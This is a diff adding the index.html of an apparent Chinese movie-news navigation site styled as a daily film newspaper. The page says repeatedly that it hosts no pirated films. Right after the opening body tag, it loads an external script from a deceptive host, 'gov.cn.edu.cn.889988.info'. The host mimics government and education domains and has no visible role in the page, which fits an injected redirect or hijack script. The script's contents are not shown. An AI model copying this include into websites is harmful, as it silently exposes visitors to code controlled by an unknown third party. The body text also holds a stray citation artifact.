@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>新新电影网 - 新片日报·影视导航 | xinxindianyingwang-h5</title>
+<meta name="description" content="新新电影网（xinxindianyingwang-h5）做“新片日报”：今日上新、周末院线感、老片重映、导演周刊。像看一份电影报纸，不提供盗版下载与在线盗播。https://xinxindianyingwang-h5.github.io" />
+<meta name="keywords" content="新新电影网,xinxindianyingwang-h5,新片日报,影视导航,今日上新,院线片单,老片重映,导演周刊" />
+<link rel="canonical" href="https://xinxindianyingwang-h5.github.io/" />
+<meta property="og:title" content="新新电影网 - 新片日报·报纸亭里的影院" />
+<meta property="og:description" content="今日上新 / 周末院线感 / 老片重映 / 导演周刊，像翻一份电影报纸。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://xinxindianyingwang-h5.github.io/" />
+<meta name="twitter:card" content="summary_large_image" />
+<style>
+:root{
+  --paper:#f6f1e7;
+  --paper2:#efe7d6;
+  --ink:#1c1a17;
+  --ink2:#5b554b;
+  --line:#cfc3a8;
+  --red:#c0392b;
+  --teal:#1f6f6b;
+  --teal2:#2c8f88;
+  --gold:#b9892f;
+  --shadow:0 5px 0 #d8cdb2;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:
+    repeating-linear-gradient(0deg,rgba(0,0,0,.015) 0 2px,transparent 2px 5px),
+    linear-gradient(180deg,#f6f1e7,#efe7d6 60%,#e7ddc7);
+  color:var(--ink);
+  font-family:"Songti SC","SimSun",Georgia,"PingFang SC","Microsoft YaHei",serif;
+  line-height:1.72;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.mono{font-family:ui-monospace,"Courier New",monospace}
+
+.topbar{position:sticky;top:0;z-index:50;background:var(--ink);color:#f6f1e7;border-bottom:3px double var(--gold)}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:62px;gap:12px}
+.logo{display:flex;align-items:baseline;gap:10px}
+.logo b{font-size:20px;letter-spacing:1px;font-weight:900}
+.logo small{font-size:11px;color:#cdbf9b;font-family:ui-monospace,monospace}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:13px;padding:7px 12px;border:1px solid #cdbf9b;color:#f6f1e7;border-radius:2px;font-weight:700}
+.nav a:hover{background:var(--red);border-color:var(--red)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid #cdbf9b;background:#000;color:#f6f1e7;font-size:20px;cursor:pointer}
+
+.masthead{padding:30px 0 14px;border-bottom:3px double var(--ink)}
+.kicker{display:flex;align-items:center;gap:10px;font-family:ui-monospace,monospace;font-size:11px;color:var(--ink2);text-transform:uppercase;letter-spacing:2px}
+.kicker .dot{width:7px;height:7px;background:var(--red);border-radius:50%}
+.title-row{display:grid;grid-template-columns:1fr auto;gap:18px;align-items:end;margin-top:8px}
+.title-row h1{font-size:clamp(34px,7vw,68px);line-height:.95;font-weight:900;letter-spacing:-1px}
+.title-row h1 em{font-style:normal;color:var(--red)}
+.sub-line{font-size:13px;color:var(--ink2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:8px 0;margin-top:10px;display:flex;gap:18px;flex-wrap:wrap;font-family:ui-monospace,monospace}
+.sub-line b{color:var(--teal)}
+
+.hero{padding:26px 0 10px;display:grid;grid-template-columns:1.6fr 1fr;gap:26px}
+.lead{background:var(--paper2);border:1px solid var(--line);padding:18px;box-shadow:var(--shadow)}
+.lead .tag{font-family:ui-monospace,monospace;font-size:10px;letter-spacing:3px;color:var(--red);border:1px solid var(--red);padding:3px 8px;display:inline-block}
+.lead h2{font-size:26px;font-weight:900;margin:10px 0;line-height:1.15}
+.lead p{font-size:14px;color:var(--ink2)}
+.lead .byline{margin-top:10px;font-family:ui-monospace,monospace;font-size:11px;color:var(--teal)}
+.side{border-left:3px double var(--ink);padding-left:18px}
+.side h3{font-size:13px;letter-spacing:2px;text-transform:uppercase;color:var(--ink2);border-bottom:1px solid var(--line);padding-bottom:6px;margin-bottom:10px}
+.side ul{list-style:none}
+.side li{padding:8px 0;border-bottom:1px dotted var(--line);font-size:13px;display:flex;gap:8px}
+.side li .no{font-family:ui-monospace,monospace;color:var(--red);font-weight:800}
+.side li a:hover{color:var(--red)}
+
+.sec{padding:30px 0;border-top:3px double var(--ink)}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px}
+.sec-head .folio{font-family:ui-monospace,monospace;font-size:11px;color:#fff;background:var(--teal);padding:3px 9px;border-radius:2px}
+.sec-head h2{font-size:22px;font-weight:900}
+.sec-head a{margin-left:auto;font-size:13px;color:var(--red);border-bottom:1px solid var(--red);font-family:ui-monospace,monospace}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.card{background:#fffdf7;border:1px solid var(--line);box-shadow:var(--shadow);display:flex;flex-direction:column}
+.card .head{display:flex;align-items:center;justify-content:space-between;padding:8px 10px;border-bottom:1px solid var(--line);font-family:ui-monospace,monospace;font-size:10px;color:var(--ink2)}
+.card .head .pg{background:var(--ink);color:#f6f1e7;padding:2px 7px}
+.card .cover{aspect-ratio:16/10;display:grid;place-items:center;font-size:46px;border-bottom:1px solid var(--line);position:relative}
+.card .cover .stamp{position:absolute;top:8px;left:8px;border:2px solid var(--red);color:var(--red);font-size:10px;font-weight:800;padding:2px 6px;transform:rotate(-6deg);font-family:ui-monospace,monospace}
+.card .body{padding:12px}
+.card h3{font-size:17px;font-weight:900}
+.card .dek{font-size:12px;color:var(--ink2);margin:6px 0}
+.card .meta{font-family:ui-monospace,monospace;font-size:11px;color:var(--teal);display:flex;gap:10px;flex-wrap:wrap;border-top:1px dotted var(--line);padding-top:8px;margin-top:8px}
+.card .more{margin-top:10px;display:inline-block;font-size:12px;font-weight:800;color:#fff;background:var(--ink);padding:6px 12px;border:1px solid var(--ink)}
+.card .more:hover{background:var(--red);border-color:var(--red)}
+.g1{background:linear-gradient(135deg,#e9eef0,#c7d6d4)}
+.g2{background:linear-gradient(135deg,#f3e7d8,#e2c79b)}
+.g3{background:linear-gradient(135deg,#efe2ec,#d9b9cf)}
+.g4{background:linear-gradient(135deg,#e7ece1,#bcd2ad)}
+.g5{background:linear-gradient(135deg,#e6e9f3,#bcc6e0)}
+.g6{background:linear-gradient(135deg,#f6e6e1,#e8b9a8)}
+
+.columns{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.col{border:1px solid var(--line);background:#fffdf7;padding:16px;box-shadow:var(--shadow)}
+.col h3{font-size:16px;font-weight:900;border-bottom:2px solid var(--ink);padding-bottom:6px;margin-bottom:10px}
+.col p{font-size:13px;color:var(--ink2)}
+.col .quote{font-style:italic;color:var(--teal);margin-top:8px;border-left:3px solid var(--gold);padding-left:10px}
+
+.week{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.day{border:1px solid var(--line);background:#fffdf7;text-align:center;padding:10px 6px}
+.day b{display:block;font-family:ui-monospace,monospace;font-size:11px;color:var(--red)}
+.day .em{font-size:24px;display:block;margin:6px 0}
+.day span{font-size:11px;color:var(--ink2)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:0;border:3px double var(--ink);background:#fffdf7}
+.about .l{padding:22px;border-right:3px double var(--ink)}
+.about .l h3{font-size:20px;font-weight:900;margin-bottom:10px}
+.about .l p{font-size:14px;color:var(--ink2);margin-bottom:10px}
+.about .r{background:var(--paper2);padding:22px;font-size:13px;color:var(--ink2)}
+.about .r li{list-style:none;padding:8px 0;border-bottom:1px dotted var(--line)}
+.about .r li:before{content:"🗞 "}
+
+.foot{border-top:3px double var(--ink);background:var(--ink);color:#e9e0c8;padding:28px 0;margin-top:10px}
+.fg{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:20px}
+.foot h4{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);margin-bottom:12px}
+.foot a{display:block;font-size:13px;color:#e9e0c8;padding:4px 0;opacity:.85}
+.foot a:hover{opacity:1;color:#ff8b7a}
+.url{display:inline-block;margin-top:8px;font-family:ui-monospace,monospace;font-size:12px;border:1px dashed var(--gold);padding:6px 10px;color:var(--gold)}
+.copy{margin-top:18px;text-align:center;font-size:11px;opacity:.6}
+
+.drawer{position:fixed;inset:0 0 0 auto;width:260px;background:#fffdf7;border-left:3px double var(--ink);z-index:60;padding:22px;transform:translateX(100%);transition:transform .28s;display:flex;flex-direction:column;gap:8px}
+.drawer.open{transform:none}
+.drawer a{padding:11px;border:1px solid var(--line);font-weight:800;color:var(--ink);background:var(--paper2)}
+.drawer .x{align-self:flex-end;background:none;border:0;font-size:24px;cursor:pointer;color:var(--red)}
+.mask{position:fixed;inset:0;background:rgba(28,26,23,.55);z-index:55;display:none}
+.mask.show{display:block}
+
+@media(max-width:1024px){
+  .hero{grid-template-columns:1fr}
+  .side{border-left:none;border-top:3px double var(--ink);padding-left:0;padding-top:14px}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .week{grid-template-columns:repeat(4,1fr)}
+  .about{grid-template-columns:1fr}
+  .about .l{border-right:none;border-bottom:3px double var(--ink)}
+  .fg{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .nav{display:none}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .columns{grid-template-columns:1fr}
+  .week{grid-template-columns:repeat(2,1fr)}
+  .fg{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap top-in">
+    <div class="logo"><b>新新电影网</b><small>xinxindianyingwang-h5</small></div>
+    <nav class="nav" id="nav">
+      <a href="#today">今日上新</a>
+      <a href="#weekend">周末院线</a>
+      <a href="#rerun">老片重映</a>
+      <a href="#director">导演周刊</a>
+      <a href="#about">编辑部</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">≡</button>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section class="masthead">
+    <div class="kicker"><span class="dot"></span> FILM DAILY · 电影日报 · 第 20261002 期</div>
+    <div class="title-row">
+      <h1>新新电影网：<br/>把片单印成<span class="mono">头版</span></h1>
+      <div class="mono" style="text-align:right;font-size:12px;color:var(--ink2)">
+        定价：一杯豆浆<br/>出版：新新放映编辑部<br/>刊号：XINXIN-H5-2026
+      </div>
+    </div>
+    <div class="sub-line">
+      <span>今日天气：<b>适合看片</b></span>
+      <span>头条：<b>国产科幻回暖</b></span>
+      <span>副刊：<b>老片重映厅开门</b></span>
+      <span>声明：<b>不提供盗版下载/在线盗播</b></span>
+    </div>
+  </section>
+
+  <section class="hero">
+    <article class="lead">
+      <span class="tag">LEAD STORY · 头版</span>
+      <h2>“新新”不是盗版老站，是每天重新排一次片单</h2>
+      <p>新新电影网（xinxindianyingwang-h5）做新片日报：今日上新、周末院线感、老片重映、导演周刊。我们不当“全网免费看”的影子站，只当影迷的报纸亭——你路过一眼，就知道今天该把哪部片放进晚上。</p>
+      <div class="byline">本报特约放映员 / 新新编辑部 / 2026-10-02 晨间版</div>
+    </article>
+    <aside class="side">
+      <h3>快讯 · Wire</h3>
+      <ul>
+        <li><span class="no">01</span><a href="#today">《星轨回音》进入“冰蓝科幻”头版 #</a></li>
+        <li><span class="no">02</span><a href="#weekend">周末院线片单更新：3 部、2 城、1 场雨 #</a></li>
+        <li><span class="no">03</span><a href="#rerun">《长安灯市录》4K 修复重映厅开票 #</a></li>
+        <li><span class="no">04</span><a href="#director">本周导演：拍“错过”的人 #</a></li>
+        <li><span class="no">05</span><a href="#about">编辑部声明：只导航，不存片 #</a></li>
+      </ul>
+    </aside>
+  </section>
+
+  <section class="sec" id="today">
+    <div class="sec-head"><span class="folio">P.01</span><h2>今日上新</h2><a href="#">全部上新 #</a></div>
+    <div class="grid">
+      <article class="card"><div class="head"><span>今日头条</span><span class="pg">A1</span></div><div class="cover g1">🛰️<span class="stamp">NEW</span></div><div class="body"><h3>星轨回音</h3><div class="dek">太空站最后一夜，工程师和 AI 聊完了人类没说出口的话。</div><div class="meta"><span>科幻</span><span>128min</span><span>4K</span></div><a href="#" class="more">读这片 →</a></div></article>
+      <article class="card"><div class="head"><span>都市副刊</span><span class="pg">A2</span></div><div class="cover g2">🏮<span class="stamp">NEW</span></div><div class="body"><h3>长安灯市录</h3><div class="dek">上元夜走马灯下，权谋像糖葫芦一样串起来。</div><div class="meta"><span>古装</span><span>26集</span><span>修复版</span></div><a href="#" class="more">读这片 →</a></div></article>
+      <article class="card"><div class="head"><span>动画周刊</span><span class="pg">A3</span></div><div class="cover g3">🐉<span class="stamp">NEW</span></div><div class="body"><h3>山海钟鸣</h3><div class="dek">归墟巨兽醒来，少年把钟声敲给了整片海。</div><div class="meta"><span>国漫</span><span>神话</span><span>原画厅</span></div><a href="#" class="more">读这片 →</a></div></article>
+    </div>
+  </section>
+
+  <section class="sec" id="weekend">
+    <div class="sec-head"><span class="folio">P.02</span><h2>周末院线感</h2><a href="#">院线片单 #</a></div>
+    <div class="week">
+      <div class="day"><b>FRI</b><span class="em">🎬</span><span>首映夜</span></div>
+      <div class="day"><b>SAT</b><span class="em">🍿</span><span>双人座</span></div>
+      <div class="day"><b>SUN</b><span class="em">🎟️</span><span>午后场</span></div>
+      <div class="day"><b>MON</b><span class="em">🌧️</span><span>雨天重看</span></div>
+      <div class="day"><b>TUE</b><span class="em">🎤</span><span>现场配乐</span></div>
+      <div class="day"><b>WED</b><span class="em">🕯️</span><span>深夜厅</span></div>
+      <div class="day"><b>THU</b><span class="em">📰</span><span>下周预告</span></div>
+    </div>
+    <div class="columns" style="margin-top:16px">
+      <div class="col"><h3>本周院线感·国产</h3><p>《星轨回音》《长安灯市录》《晚风邮差》三部撑起“科幻—古装—治愈”三角，排片像头版三栏：左科技，中江湖，右心事。</p><div class="quote">“院线不一定贵，贵的是你不敢选。”</div></div>
+      <div class="col"><h3>本周院线感·引进</h3><p>动画、悬疑、音乐传记轮流上桌。引进片不放“完整盗版”，只给正规平台入口与上映日历。</p><div class="quote">“好片子值得买张票，也值得等正版。”</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="rerun">
+    <div class="sec-head"><span class="folio">P.03</span><h2>老片重映厅</h2><a href="#">重映日历 #</a></div>
+    <div class="grid">
+      <article class="card"><div class="head"><span>4K修复</span><span class="pg">R1</span></div><div class="cover g4">🎞️</div><div class="body"><h3>夏日来信（重映）</h3><div class="dek">二十年后再看，才懂那封没寄出的信是写给自己的。</div><div class="meta"><span>青春</span><span>修复</span><span>胶片厅</span></div><a href="#" class="more">查场次 →</a></div></article>
+      <article class="card"><div class="head"><span>导演剪辑</span><span class="pg">R2</span></div><div class="cover g5">🎻</div><div class="body"><h3>夜曲都市（DC版）</h3><div class="dek">多 12 分钟驻唱、少 3 个广告位，霓虹更慢一点。</div><div class="meta"><span>音乐</span><span>DC</span><span>深夜</span></div><a href="#" class="more">查场次 →</a></div></article>
+      <article class="card"><div class="head"><span>纪念放映</span><span class="pg">R3</span></div><div class="cover g6">🎆</div><div class="body"><h3>烟花巷口（30周年）</h3><div class="dek">老影院拆了，但片子里那场夏祭永远没结束。</div><div class="meta"><span>文艺</span><span>纪念</span><span>限量</span></div><a href="#" class="more">查场次 →</a></div></article>
+    </div>
+  </section>
+
+  <section class="sec" id="director">
+    <div class="sec-head"><span class="folio">P.04</span><h2>导演周刊</h2><a href="#">往期周刊 #</a></div>
+    <div class="columns">
+      <div class="col"><h3>本周导演：拍“错过”的人</h3><p>不拍大团圆，拍走廊、站台、未接来电。镜头停在三秒，字幕起，观众自己补完结局。</p><div class="quote">“他不是不会爱，是把爱拍成了告别。”</div></div>
+      <div class="col"><h3>片单语法</h3><p>新新电影网用报纸逻辑排片：头版放大片，副刊放小众，讣告放下线片，预告放下周。影迷像读报，不焦虑“还有什么没看”。</p><div class="quote">“片单不是货架，是社论。”</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-head"><span class="folio">P.05</span><h2>编辑部声明</h2></div>
+    <div class="about">
+      <div class="l">
+        <h3>新新电影网 = 新片日报，不是“新新影院”盗版镜像</h3>
+        <p>网上确有“新新影院 / 新新影视 / xinxindianyingwang 各种镜像”做免费高清、百度影音、在线下载；本站与它们无关联、不共享资源、不跳转盗版源。[8,2](@ref)</p>
+        <p>本站只做：新片信息、分类片单、上映/重映日历、导演与类型索引。视频不存储、不转码、不直链盗播；如列播放入口，仅指向 B 站 / 腾讯视频 / 爱奇艺 / 咪咕等持证平台或片方公开物料。</p>
+        <p>单文件 index.html、CSS/JS 内联、移动端自适应，适合 GitHub Pages 做“电影报纸”书签站、影迷导航站、片单博客前端。</p>
+      </div>
+      <ul class="r">
+        <li>报纸米白 + 油墨黑 + 邮戳红</li>
+        <li>头版 / 副刊 / 讣告 / 预告 排片法</li>
+        <li>今日上新 + 周末院线 + 老片重映</li>
+        <li>导演周刊 + 类型社论</li>
+        <li>内链用 #，不伪造深链</li>
+        <li>必应友好：标题/描述/canonical 齐</li>
+      </ul>
+    </div>
+  </section>
+
+</div>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>新新电影网</h4>
+        <p style="font-size:13px;opacity:.85">新片日报：今日上新 / 周末院线 / 老片重映 / 导演周刊。影迷的报纸亭，不提供盗版下载。</p>
+        <span class="url">https://xinxindianyingwang-h5.github.io</span>
+      </div>
+      <div><h4>版面</h4><a href="#today">今日上新 #</a><a href="#weekend">周末院线 #</a><a href="#rerun">老片重映 #</a><a href="#director">导演周刊 #</a></div>
+      <div><h4>分类</h4><a href="#">科幻 #</a><a href="#">古装 #</a><a href="#">国漫 #</a><a href="#">音乐传记 #</a></div>
+      <div><h4>编辑部</h4><a href="#today">头版 #</a><a href="#rerun">副刊 #</a><a href="#director">周刊 #</a><a href="#about">声明 #</a></div>
+    </div>
+    <div class="copy">© 2026 新新电影网 xinxindianyingwang-h5 · 新片日报式影视导航演示。与“新新影院/新新影视”等盗版影视站无关联；不存储、不转码、不提供未经授权播放。</div>
+  </div>
+</footer>
+
+<div class="mask" id="mask"></div>
+<aside class="drawer" id="drawer">
+  <button class="x" id="drawerClose">×</button>
+  <a href="#today">今日上新</a>
+  <a href="#weekend">周末院线</a>
+  <a href="#rerun">老片重映</a>
+  <a href="#director">导演周刊</a>
+  <a href="#about">编辑部</a>
+</aside>
+
+<script>
+  var menuBtn=document.getElementById('menuBtn');
+  var drawer=document.getElementById('drawer');
+  var mask=document.getElementById('mask');
+  var close=document.getElementById('drawerClose');
+  menuBtn.addEventListener('click',function(){drawer.classList.add('open');mask.classList.add('show')});
+  close.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  mask.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  drawer.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')})});
+</script>
+</body>
+</html>
